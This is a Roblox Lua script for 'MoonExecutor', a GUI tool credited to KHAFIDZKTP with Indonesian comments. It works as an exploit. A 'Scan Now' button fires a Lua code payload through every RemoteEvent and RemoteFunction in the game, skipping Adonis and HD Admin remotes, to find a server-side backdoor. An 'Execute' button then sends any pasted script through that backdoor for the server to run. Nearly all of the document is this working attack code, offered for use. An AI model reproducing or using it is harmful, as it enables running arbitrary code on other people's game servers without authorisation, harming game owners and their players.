-- Instances: 22 | Scripts: 2 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.KHAFIDZKTP.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame
LMG2L["MenuInjectFrame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MenuInjectFrame_2"]["BorderSizePixel"] = 0;
LMG2L["MenuInjectFrame_2"]["BackgroundColor3"] = Color3.fromRGB(6, 20, 57);
LMG2L["MenuInjectFrame_2"]["Size"] = UDim2.new(0.4043, 0, 0.39197, 0);
LMG2L["MenuInjectFrame_2"]["Position"] = UDim2.new(0.30586, 0, 0.29704, 0);
LMG2L["MenuInjectFrame_2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["MenuInjectFrame_2"]["Name"] = [[MenuInjectFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning 
LMG2L["Scanning _3"] = Instance.new("TextButton", LMG2L["MenuInjectFrame_2"]);
LMG2L["Scanning _3"]["TextWrapped"] = true;
LMG2L["Scanning _3"]["TextStrokeTransparency"] = 0;
LMG2L["Scanning _3"]["RichText"] = true;
LMG2L["Scanning _3"]["BorderSizePixel"] = 0;
LMG2L["Scanning _3"]["TextScaled"] = true;
LMG2L["Scanning _3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Scanning _3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Scanning _3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Scanning _3"]["Size"] = UDim2.new(0.7913, 0, 0.58594, 0);
LMG2L["Scanning _3"]["Text"] = [[Scan Now]];
LMG2L["Scanning _3"]["Name"] = [[Scanning ]];
LMG2L["Scanning _3"]["Position"] = UDim2.new(0.11304, 0, 0.21875, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UICorner
LMG2L["UICorner_4"] = Instance.new("UICorner", LMG2L["Scanning _3"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
LMG2L["ScanScript_5"] = Instance.new("LocalScript", LMG2L["Scanning _3"]);
LMG2L["ScanScript_5"]["Name"] = [[ScanScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UIStroke
LMG2L["UIStroke_6"] = Instance.new("UIStroke", LMG2L["Scanning _3"]);
LMG2L["UIStroke_6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_6"]["Color"] = Color3.fromRGB(227, 12, 237);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UICorner
LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["MenuInjectFrame_2"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_8"] = Instance.new("UIAspectRatioConstraint", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIAspectRatioConstraint_8"]["AspectRatio"] = 1.79688;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.MoonExecutorText
LMG2L["MoonExecutorText_9"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
LMG2L["MoonExecutorText_9"]["TextWrapped"] = true;
LMG2L["MoonExecutorText_9"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutorText_9"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutorText_9"]["TextScaled"] = true;
LMG2L["MoonExecutorText_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutorText_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutorText_9"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutorText_9"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutorText_9"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
LMG2L["MoonExecutorText_9"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutorText_9"]["Name"] = [[MoonExecutorText]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIStroke
LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 0, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame
LMG2L["MainFrame_b"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MainFrame_b"]["Visible"] = false;
LMG2L["MainFrame_b"]["BorderSizePixel"] = 0;
LMG2L["MainFrame_b"]["BackgroundColor3"] = Color3.fromRGB(85, 85, 85);
LMG2L["MainFrame_b"]["Size"] = UDim2.new(0.50977, 0, 0.54815, 0);
LMG2L["MainFrame_b"]["Position"] = UDim2.new(0.24961, 0, 0.25723, 0);
LMG2L["MainFrame_b"]["Name"] = [[MainFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UICorner
LMG2L["UICorner_c"] = Instance.new("UICorner", LMG2L["MainFrame_b"]);
LMG2L["UICorner_c"]["CornerRadius"] = UDim.new(0.01, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_d"] = Instance.new("UIAspectRatioConstraint", LMG2L["MainFrame_b"]);
LMG2L["UIAspectRatioConstraint_d"]["AspectRatio"] = 1.62011;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIStroke
LMG2L["UIStroke_e"] = Instance.new("UIStroke", LMG2L["MainFrame_b"]);
LMG2L["UIStroke_e"]["Thickness"] = 7;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton
LMG2L["ExecuteButton_f"] = Instance.new("TextButton", LMG2L["MainFrame_b"]);
LMG2L["ExecuteButton_f"]["TextWrapped"] = true;
LMG2L["ExecuteButton_f"]["BorderSizePixel"] = 0;
LMG2L["ExecuteButton_f"]["TextScaled"] = true;
LMG2L["ExecuteButton_f"]["TextColor3"] = Color3.fromRGB(22, 255, 19);
LMG2L["ExecuteButton_f"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
LMG2L["ExecuteButton_f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["ExecuteButton_f"]["Size"] = UDim2.new(0.18276, 0, 0.10615, 0);
LMG2L["ExecuteButton_f"]["Text"] = [[Execute]];
LMG2L["ExecuteButton_f"]["Name"] = [[ExecuteButton]];
LMG2L["ExecuteButton_f"]["Position"] = UDim2.new(0.0931, 0, 0.85475, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.UICorner
LMG2L["UICorner_10"] = Instance.new("UICorner", LMG2L["ExecuteButton_f"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.LocalScript
LMG2L["LocalScript_11"] = Instance.new("LocalScript", LMG2L["ExecuteButton_f"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.MoonExecutor
LMG2L["MoonExecutor_12"] = Instance.new("TextLabel", LMG2L["MainFrame_b"]);
LMG2L["MoonExecutor_12"]["TextWrapped"] = true;
LMG2L["MoonExecutor_12"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutor_12"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutor_12"]["TextScaled"] = true;
LMG2L["MoonExecutor_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutor_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutor_12"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutor_12"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutor_12"]["Size"] = UDim2.new(0.78966, 0, 0.12849, 0);
LMG2L["MoonExecutor_12"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutor_12"]["Name"] = [[MoonExecutor]];
LMG2L["MoonExecutor_12"]["Position"] = UDim2.new(0.11379, 0, -0.00559, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ScrollingFrame
LMG2L["ScrollingFrame_13"] = Instance.new("ScrollingFrame", LMG2L["MainFrame_b"]);
LMG2L["ScrollingFrame_13"]["BorderSizePixel"] = 0;
LMG2L["ScrollingFrame_13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ScrollingFrame_13"]["Size"] = UDim2.new(0.8931, 0, 0.93855, 0);
LMG2L["ScrollingFrame_13"]["Position"] = UDim2.new(0.06552, 0, -0.12849, 0);
LMG2L["ScrollingFrame_13"]["BackgroundTransparency"] = 1;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ScrollingFrame.CoderBox
LMG2L["CoderBox_14"] = Instance.new("TextBox", LMG2L["ScrollingFrame_13"]);
LMG2L["CoderBox_14"]["Name"] = [[CoderBox]];
LMG2L["CoderBox_14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["CoderBox_14"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_14"]["BorderSizePixel"] = 0;
LMG2L["CoderBox_14"]["TextWrapped"] = true;
LMG2L["CoderBox_14"]["TextSize"] = 18;
LMG2L["CoderBox_14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_14"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["CoderBox_14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["CoderBox_14"]["RichText"] = true;
LMG2L["CoderBox_14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["CoderBox_14"]["MultiLine"] = true;
LMG2L["CoderBox_14"]["PlaceholderText"] = [[Paste Your Script Here!]];
LMG2L["CoderBox_14"]["Size"] = UDim2.new(0.84828, 0, 0.65922, 0);
LMG2L["CoderBox_14"]["Position"] = UDim2.new(0.08621, 0, 0.12291, 0);
LMG2L["CoderBox_14"]["Text"] = [[Paste Your Script Here]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ScrollingFrame.UICorner
LMG2L["UICorner_15"] = Instance.new("UICorner", LMG2L["ScrollingFrame_13"]);
LMG2L["UICorner_15"]["CornerRadius"] = UDim.new(0, 5);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.Versi
LMG2L["Versi_16"] = Instance.new("TextLabel", LMG2L["MainFrame_b"]);
LMG2L["Versi_16"]["TextWrapped"] = true;
LMG2L["Versi_16"]["BorderSizePixel"] = 0;
LMG2L["Versi_16"]["TextTransparency"] = 0.6;
LMG2L["Versi_16"]["TextScaled"] = true;
LMG2L["Versi_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Versi_16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_16"]["BackgroundTransparency"] = 1;
LMG2L["Versi_16"]["RichText"] = true;
LMG2L["Versi_16"]["Size"] = UDim2.new(0.11379, 0, 0.0838, 0);
LMG2L["Versi_16"]["Text"] = [[v0.0.1]];
LMG2L["Versi_16"]["Name"] = [[Versi]];
LMG2L["Versi_16"]["Position"] = UDim2.new(0.87931, 0, 0.90503, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
local function C_5()
	local script = LMG2L["ScanScript_5"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	local playerGui = player:WaitForChild("PlayerGui")	
	
	local isScanning = false	
	
	-- Helper: Fire remote dengan payload	
	local function runRemote(remote, data)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(data)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function() remote:InvokeServer(data) end)	
		end	
	end	
	
	-- Helper: Generate nama random	
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}	
	local function generateName(length)	
		local text = ""	
		for i = 1, length do	
			text = text .. alphabet[math.random(1, #alphabet)]	
		end	
		return text	
	end	
	
	-- Fungsi utama scan backdoor (mirip LALOL Hub)	
	local function findBackdoor()	
		local remotes = {}	
		local foundRemote = nil	
	
		-- Cek protected backdoor khusus LALOL style	
		local protected = game:GetService("ReplicatedStorage"):FindFirstChild("lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId)	
		if protected and protected:IsA("RemoteFunction") then	
			local code = generateName(math.random(12, 30))	
			task.spawn(function()	
				protected:InvokeServer("lalol", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			end)	
			remotes[code] = protected	
		end	
	
		-- Loop semua descendants	
		for _, remote in game:GetDescendants() do	
			if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end	
	
			-- Skip RobloxReplicatedStorage	
			if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then continue end	
	
			local rs = game:GetService("ReplicatedStorage")	
	
			if remote.Parent == rs or remote.Parent.Parent == rs or remote.Parent.Parent.Parent == rs then	
				-- Skip Adonis	
				if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then continue end	
				-- Skip HD Admin	
				if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then continue end	
				-- Skip Chat Events	
				if remote.Parent.Name == "DefaultChatSystemChatEvents" then continue end	
			end	
	
			-- Kirim payload	
			local code = generateName(math.random(12, 30))	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			remotes[code] = remote	
		end	
	
		-- Cek apakah ada Model yang muncul di workspace (100x iterasi)	
		for i = 1, 100 do	
			for code, remote in remotes do	
				if workspace:FindFirstChild(code) then	
					foundRemote = remote	
					return foundRemote	
				end	
			end	
			task.wait()	
		end	
	
		return nil	
	end	
	
	button.MouseButton1Click:Connect(function()	
		if isScanning then return end	
		isScanning = true	
	
		-- 1. RESET tampilan	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
	
		-- 2. ANIMASI SCAN	
		local startTime = tick()	
		task.spawn(function()	
			while isScanning and (tick() - startTime) < 5 do	
				button.Text = "Scan." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan.." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan..." task.wait(0.4)	
			end	
		end)	
	
		-- 3. JALANKAN SCAN	
		local backdoor = findBackdoor()	
	
		-- 4. CARI UI	
		local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
		local mainFrame = screenGui and screenGui:FindFirstChild("MainFrame")	
		local menuInjectFrame = button.Parent	
	
		isScanning = false	
	
	-- Setelah: local backdoor = findBackdoor()	
	if backdoor and mainFrame then	
	    _G.MoonBackdoor = backdoor  -- ← TAMBAH INI	
	    button.Text = "Found!"	
	    -- ... sisa kode	
	
			task.wait(0.5)	
	
			-- Hint muncul	
			local hint = Instance.new("Hint")	
			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP"	
			hint.Parent = player.Character	
	
			-- Tukar UI	
			mainFrame.Visible = true	
			menuInjectFrame.Visible = false	
	
			-- Hint hilang setelah 5 detik	
			task.wait(5)	
			hint:Destroy()	
		else	
			-- GAGAL	
			button.TextColor3 = Color3.fromRGB(255, 0, 0)	
			if not backdoor then	
				button.Text = "No Backdoor Found :("	
			else	
				button.Text = "MainFrame Not Found :("	
			end	
		end	
	end)	
end;
task.spawn(C_5);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.LocalScript
local function C_11()
	local script = LMG2L["LocalScript_11"];
	local button = script.Parent	
	local mainFrame = button.Parent.Parent -- ExecuteButton > MainFrame	
	
	-- CoderBox sekarang di dalam ScrollingFrame	
	local scrollFrame = mainFrame:WaitForChild("ScrollingFrame")	
	local coderBox = scrollFrame:WaitForChild("CoderBox")	
	
	local player = game.Players.LocalPlayer	
	
	button.MouseButton1Click:Connect(function()	
		-- Ambil backdoor dari _G (di-set oleh ScanScript setelah Found)	
		local backdoor = _G.MoonBackdoor	
			
		if not backdoor then	
			button.Text = "No Backdoor!"	
			button.TextColor3 = Color3.fromRGB(255, 80, 80)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
			return	
		end	
	
		-- Ambil kode & replace %%username%%	
		local code = string.gsub(coderBox.Text, "%%username%%", player.Name)	
	
		if code ~= "" then	
			button.Text = "Running..."	
			button.TextColor3 = Color3.fromRGB(255, 255, 0)	
	
			-- Kirim ke server (sama seperti LALOL — raw code atau require langsung dikirim)	
			if backdoor:IsA("RemoteEvent") then	
				backdoor:FireServer(code)	
			elseif backdoor:IsA("RemoteFunction") then	
				task.spawn(function()	
					local ok, result = pcall(function()	
						return backdoor:InvokeServer(code)	
					end)	
					if result then	
						warn("[MoonExecutor] Server response: " .. tostring(result))	
					end	
				end)	
			end	
	
			task.wait(0.5)	
			button.Text = "Executed!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		else	
			button.Text = "Empty Code!"	
			button.TextColor3 = Color3.fromRGB(255, 100, 100)	
			task.wait(1)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		end	
	end)	
end;
task.spawn(C_11);

return LMG2L["ScreenGui_1"], require;
